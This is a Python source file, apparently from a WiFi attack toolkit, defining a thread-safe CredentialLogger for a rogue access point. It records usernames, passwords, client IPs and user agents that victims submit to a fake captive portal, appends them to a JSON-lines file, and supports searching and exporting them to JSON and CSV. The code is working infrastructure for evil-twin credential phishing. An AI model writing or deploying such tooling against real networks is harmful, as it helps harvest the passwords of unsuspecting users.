"""CredentialLogger – log captured credentials with timestamps.

Thread-safe credential storage that persists to a JSON lines file and
provides search / export capabilities.
"""

import json
import os
import threading
import time
from typing import Dict, List, Optional

from wifi_aio.exceptions import WiFiConnectionError
from wifi_aio.logger import get_logger

logger = get_logger("rogue.credential_logger")


class CredentialLogger:
    """Thread-safe credential logger with file persistence.

    Each captured credential set is stored as a JSON object augmented
    with a timestamp and sequential ID, then appended to a JSON-lines
    log file.

    Parameters
    ----------
    log_file:
        Path to the JSON-lines credential log file.
    ssid:
        SSID of the rogue AP (stored with each entry for context).
    auto_flush:
        If ``True`` (default), every ``log()`` call immediately writes
        to disk.
    """

    def __init__(
        self,
        log_file: str = "/tmp/wifiaio/rogue/credentials.jsonl",
        ssid: str = "",
        auto_flush: bool = True,
    ) -> None:
        self.log_file = log_file
        self.ssid = ssid
        self.auto_flush = auto_flush
        self._entries: List[Dict] = []
        self._counter: int = 0
        self._lock = threading.Lock()
        os.makedirs(os.path.dirname(log_file), exist_ok=True)

    # ── Logging ────────────────────────────────────────────────────────

    def log(self, credentials: Dict[str, str], source_ip: str = "") -> int:
        """Log a set of captured credentials.

        Parameters
        ----------
        credentials:
            Dict of field-name → value pairs captured from the portal.
        source_ip:
            IP address of the client that submitted the credentials.

        Returns the sequential ID assigned to this entry.
        """
        with self._lock:
            self._counter += 1
            entry = {
                "id": self._counter,
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                "epoch": time.time(),
                "ssid": self.ssid,
                "source_ip": source_ip or credentials.get("_client_ip", ""),
                "credentials": {
                    k: v for k, v in credentials.items()
                    if not k.startswith("_")  # strip internal metadata
                },
                "user_agent": credentials.get("_user_agent", ""),
            }
            self._entries.append(entry)

            if self.auto_flush:
                self._append_to_file(entry)

            logger.info(
                "Credential #%d captured from %s (fields: %s)",
                entry["id"],
                entry["source_ip"],
                list(entry["credentials"].keys()),
            )
            return entry["id"]

    # ── Querying ───────────────────────────────────────────────────────

    def get_all(self) -> List[Dict]:
        """Return all logged entries (in-memory only)."""
        with self._lock:
            return list(self._entries)

    def get_by_id(self, entry_id: int) -> Optional[Dict]:
        """Return a specific entry by its ID, or ``None``."""
        with self._lock:
            for entry in self._entries:
                if entry["id"] == entry_id:
                    return dict(entry)
        return None

    def search(self, field: str, value: str) -> List[Dict]:
        """Search entries where *field* in the credentials dict matches *value*.

        The comparison is case-insensitive substring matching.
        """
        results: List[Dict] = []
        value_lower = value.lower()
        with self._lock:
            for entry in self._entries:
                creds = entry.get("credentials", {})
                if field in creds and value_lower in str(creds[field]).lower():
                    results.append(dict(entry))
        return results

    def search_by_ip(self, source_ip: str) -> List[Dict]:
        """Return all entries originating from *source_ip*."""
        with self._lock:
            return [dict(e) for e in self._entries if e.get("source_ip") == source_ip]

    def count(self) -> int:
        """Return the total number of logged entries."""
        with self._lock:
            return len(self._entries)

    # ── Persistence ────────────────────────────────────────────────────

    def flush(self) -> None:
        """Write all in-memory entries to the log file.

        This is only needed when ``auto_flush`` is ``False``; otherwise
        every ``log()`` call already writes to disk.
        """
        with self._lock:
            with open(self.log_file, "a", encoding="utf-8") as fh:
                for entry in self._entries:
                    fh.write(json.dumps(entry) + "\n")
            logger.debug("Flushed %d entries to %s", len(self._entries), self.log_file)

    def load_from_file(self) -> int:
        """Load previously saved entries from the log file.

        Returns the number of entries loaded.
        """
        if not os.path.isfile(self.log_file):
            return 0

        loaded = 0
        with self._lock:
            with open(self.log_file, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry = json.loads(line)
                        self._entries.append(entry)
                        if entry.get("id", 0) > self._counter:
                            self._counter = entry["id"]
                        loaded += 1
                    except json.JSONDecodeError:
                        logger.warning("Skipping malformed log line")
        logger.info("Loaded %d entries from %s", loaded, self.log_file)
        return loaded

    def clear(self) -> None:
        """Remove all in-memory entries and delete the log file."""
        with self._lock:
            self._entries.clear()
            self._counter = 0
        if os.path.isfile(self.log_file):
            os.remove(self.log_file)
            logger.info("Credential log file removed: %s", self.log_file)

    # ── Export ─────────────────────────────────────────────────────────

    def export_json(self, path: str) -> str:
        """Export all entries as a pretty-printed JSON file.

        Returns the path written.
        """
        with self._lock:
            data = list(self._entries)
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        logger.info("Exported %d entries to %s", len(data), path)
        return path

    def export_csv(self, path: str) -> str:
        """Export all entries as a CSV file.

        Columns: id, timestamp, ssid, source_ip, username, password, user_agent.
        Returns the path written.
        """
        import csv

        with self._lock:
            data = list(self._entries)

        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(["id", "timestamp", "ssid", "source_ip", "username", "password", "user_agent"])
            for entry in data:
                creds = entry.get("credentials", {})
                writer.writerow([
                    entry.get("id", ""),
                    entry.get("timestamp", ""),
                    entry.get("ssid", ""),
                    entry.get("source_ip", ""),
                    creds.get("username", ""),
                    creds.get("password", ""),
                    entry.get("user_agent", ""),
                ])
        logger.info("Exported %d entries as CSV to %s", len(data), path)
        return path

    # ── Internals ──────────────────────────────────────────────────────

    def _append_to_file(self, entry: Dict) -> None:
        """Append a single entry to the JSON-lines log file."""
        with open(self.log_file, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")
